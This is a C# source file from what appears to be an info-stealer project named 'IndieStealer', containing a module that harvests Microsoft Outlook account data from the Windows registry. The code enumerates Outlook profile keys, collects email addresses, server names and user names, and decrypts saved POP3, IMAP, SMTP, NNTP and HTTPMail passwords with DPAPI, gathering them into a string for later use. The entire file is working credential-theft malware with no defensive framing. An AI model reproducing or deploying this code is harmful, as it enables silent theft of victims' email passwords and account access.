using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace IndieStealer.Collect.Messengers
{
    class Outlook
    {
        public static string foundInfo { get; set; } = "";
        public static void Collect()
        {
            foreach (var regPath in OutlookData.RegPaths)
            {
                try
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, false))
                    {
                        if (key == null)
                            continue;
                        object val = null;
                        foreach (var regValueName in OutlookData.dataNames)
                        {
                            try
                            {
                                val = key.GetValue(regValueName);
                            }
                            catch (Exception exception)
                            { }
                            if (val == null)
                                continue;
                            string[] subKeyNames = key.GetSubKeyNames();
                            OutlookRecursive(regValueName, val, key, subKeyNames);
                        }
                    
                    }
                }
                catch (Exception exception)
                {}
                
                
            }
        
            
        }
        private static void OutlookRecursive(string valueName, object value, RegistryKey regPath, string[] subKeyNames)
        {
            try
            {
                if (valueName.Contains("Password") && !valueName.Contains("2"))
                {
                    foundInfo += valueName + ": " + OutlookDecrypt((byte[])value) + Environment.NewLine;
                }
                else
                {
                    if (OutlookData.smtp.IsMatch(value.ToString()) || OutlookData.mail.IsMatch(value.ToString()))
                        foundInfo += valueName + ": " + value  + Environment.NewLine + "________________________" + Environment.NewLine;
                    else
                        foundInfo += valueName + ": " + Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "") + Environment.NewLine;
                }

                foreach (var subKey in subKeyNames)
                {
                    RegistryKey sub = regPath.OpenSubKey(subKey);
                    if (sub == null)
                    {
                        continue;
                    }
                    foreach (var regValueName in OutlookData.dataNames)
                    {
                        object val = null;
                        try
                        {
                            val = sub.GetValue(regValueName);
                        }
                        catch (Exception exception)
                        { }
                        if (val == null)
                            continue;
                        string[] subKeyNames1 = sub.GetSubKeyNames();
                        OutlookRecursive(regValueName, val, sub, subKeyNames1);
                    }
                    sub.Close();
                }
                
            }   
            catch (Exception exception)
            {}
        }
        private static string OutlookDecrypt(byte[] data)
        {
            try
            {
                byte[] decdata = new byte[data.Length - 1];
                Buffer.BlockCopy(data, 1, decdata, 0, data.Length - 1);
                byte[] decrypted = ProtectedData.Unprotect(decdata, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted).Replace(Convert.ToChar(0).ToString(), "");
            }
            catch
            { }
            return Info.Error;
        }

    }

    class OutlookData
    {
        public static Regex smtp = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
        public static Regex mail = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
        public static string[] RegPaths = new string[]
        {
            "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
        };

        public static string[] dataNames = new string[]
        {
            "SMTP Email Address",
            "SMTP Server",
            "POP3 Server",
            "POP3 User Name",
            "SMTP User Name",
            "NNTP Email Address",
            "NNTP User Name",
            "NNTP Server",
            "IMAP Server",
            "IMAP User Name",
            "Email",
            "HTTP User",
            "HTTP Server URL",
            "POP3 User",
            "IMAP User",
            "HTTPMail User Name",
            "HTTPMail Server",
            "SMTP User",
            "POP3 Password2",
            "IMAP Password2",
            "NNTP Password2",
            "HTTPMail Password2",
            "SMTP Password2",
            "POP3 Password",
            "IMAP Password",
            "NNTP Password",
            "HTTPMail Password",
            "SMTP Password",

        };
    }
}
